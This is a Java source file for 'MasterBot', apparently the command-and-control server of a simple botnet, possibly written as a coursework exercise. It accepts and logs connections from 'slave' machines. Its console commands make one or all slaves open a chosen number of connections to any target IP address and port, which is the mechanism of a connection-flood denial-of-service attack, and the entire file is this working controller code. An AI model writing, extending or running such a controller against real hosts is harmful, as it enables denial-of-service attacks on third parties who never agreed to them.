import java.io.*;
import java.net.*;
import java.text.*;
import java.util.*;

public class MasterBot extends Thread 
{
	//variable declarations
	private ServerSocket ms;
	static String slaveIPAddress, targetIPAddress;
	static int noOfSlavesConnected, targetPort, connectionCount;
	static ArrayList<Socket> clientList = new ArrayList<>();
	static SlaveBot b = new SlaveBot();
	
	//-----------------------------------------------------------------------------------------------------------------------------------------------
	// constructor
	public MasterBot(int port) throws IOException 
	{
		ms = new ServerSocket(port);
	}
	//	constructor
	//-----------------------------------------------------------------------------------------------------------------------------------------------
	// run() method for threads
	public void run() 
	{
		noOfSlavesConnected = 0;
		BufferedWriter bw = null;
		String data = "";

		try 
		{
			File file = new File("clientLog.txt");
			bw = new BufferedWriter(new FileWriter(file));
			Date date = new Date();
			data = "SlaveHostName" + "\t" + "IPAddress" + "\t\t" + "SourcePortNumber" + "\t" + "RegistrationDate";
			bw.write(data);

			while (true) 
			{
				Socket ss = new Socket();
				ss = ms.accept();
				clientList.add(ss);
				noOfSlavesConnected++;
				bw.newLine();
				
				data = "Slave" + noOfSlavesConnected + "\t";
				bw.write(data);

				data = "\t" + ss.getRemoteSocketAddress() + "\t";
				bw.write(data);

				data = ss.getPort() + "\t\t";
				bw.write(data);

				data = "\t" + new SimpleDateFormat("yyyy-mm-dd").format(date);
				bw.write(data);

				bw.flush();
			}

		} catch (IOException e) 
		{
			e.printStackTrace();
		}

		finally 
		{
			try 
			{
				ms.close();
			} catch (IOException e) 
			{
				e.printStackTrace();
			}
		}
	}
	//	run() method for threads
	//-----------------------------------------------------------------------------------------------------------------------------------------------
	// main
	public static void main(String[] args) 
	{
		String commandLine;
		BufferedReader br1 = new BufferedReader(new InputStreamReader(System.in));
		int port = 0;
		//input format example = "java MasterBot -p 9999"
		if (args.length != 0) 
		{
			port = Integer.parseInt(args[1]);
		} 
		//input format example = "java MasterBot"
		else 
		{
			System.out.println("Using default port number 2317");
			port = 2317;
		}

		if (port != 0) 
		{
			try 
			{
				Thread t = new MasterBot(port);
				t.start();
			} catch (IOException e) 
			{
				e.printStackTrace();
			}
		}
		//command line implementation 
		while (true) 
		{
			try 
			{
				System.out.print("> ");
				commandLine = br1.readLine();
				// loop if no data is entered
				if (commandLine.equals("")) 
				{
					continue;
				}
				// display ArrayList of Clients
				else if (commandLine.equalsIgnoreCase("clientList")) 
				{
					System.out.println(clientList);
					continue;
				}
				// list function logic
				else if (commandLine.equals("list")) 
				{
					BufferedReader br2 = new BufferedReader(new FileReader("clientLog.txt"));
					String currentLine;
					while ((currentLine = br2.readLine()) != null) 
					{
						System.out.println(currentLine);
					}
					System.out.println("Total number of connected slaves : " + noOfSlavesConnected);
					continue;
				}
				// connect function logic
				else if (commandLine.startsWith("connect")) 
				{
					//if no slaves are connected
					if(noOfSlavesConnected == 0)
					{
						System.out.println("No Slaves are currently connected to the server.");
						continue;
					}
					
					String[] dataArray = commandLine.split("\\s+");
					//if number of connections is not defined
					if(dataArray.length == 4)
					{
						slaveIPAddress = dataArray[1];
						targetIPAddress = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
						connectionCount = 1;
					}
					//if number of connections is defined
					else if(dataArray.length == 5)
					{
						slaveIPAddress = dataArray[1];
						targetIPAddress = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
						connectionCount = Integer.parseInt(dataArray[4]);
					}
					//for all slaves
					if (slaveIPAddress.equalsIgnoreCase("all"))
					{
						for(int i=0; i<clientList.size(); i++)
						{
							for(int j=0; j<connectionCount; j++)
							{
								b.connect(clientList.get(i), targetIPAddress, targetPort);
							}
						}
					}
					//for specific slave
					else
					{
						String line;
						for(int i=0; i<clientList.size(); i++)
						{
							line = "/"+slaveIPAddress;

							if(line.equalsIgnoreCase(clientList.get(i).getRemoteSocketAddress().toString()))
							{
								for(int j=0; j<connectionCount; j++)
								{
									b.connect(clientList.get(i), targetIPAddress, targetPort);
								}
							}
						}
					}
					continue;
				}
				//disconnect function logic
				else if (commandLine.startsWith("disconnect"))
				{
					//if no slaves are connected
					if(noOfSlavesConnected == 0)
					{
						System.out.println("No Slaves are currently connected to the server.");
						continue;
					}
					
					String[] dataArray = commandLine.split("\\s+");
					//if number of connections is not defined
					if(dataArray.length == 4)
					{
						slaveIPAddress = dataArray[1];
						targetIPAddress = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
						connectionCount = 1;
					}
					//if number of connections is defined
					else if(dataArray.length == 5)
					{
						slaveIPAddress = dataArray[1];
						targetIPAddress = dataArray[2];
						targetPort = Integer.parseInt(dataArray[3]);
						connectionCount = Integer.parseInt(dataArray[4]);
					}
					//for all slaves
					if (slaveIPAddress.equalsIgnoreCase("all"))
					{
						for(int i=0; i<clientList.size(); i++)
						{
							for(int j=0; j<connectionCount; j++)
							{
								b.disconnect(clientList.get(i), targetIPAddress, targetPort);
							}
						}
					}
					//for specific slave
					else
					{
						String line;
						for(int i=0; i<clientList.size(); i++)
						{
							line = "/"+slaveIPAddress;

							if(line.equalsIgnoreCase(clientList.get(i).getRemoteSocketAddress().toString()))
							{
								for(int j=0; j<connectionCount; j++)
								{
									b.disconnect(clientList.get(i), targetIPAddress, targetPort);
								}
							}
						}
					}
					continue;
				}
				// exit function logic
				else if (commandLine.equalsIgnoreCase("exit") || commandLine.equalsIgnoreCase("quit") || commandLine.equalsIgnoreCase("-1")) 
				{
					System.out.println("Shell Terminated.");
					System.exit(0);
				}
				else
				{
					System.out.println("Available Commands are : list, connect, disconnect and exit");
					continue;
				}
				
			} catch (IOException e) 
			{
				e.printStackTrace();
			}
		}
	}
	// main
	//-----------------------------------------------------------------------------------------------------------------------------------------------
}
		
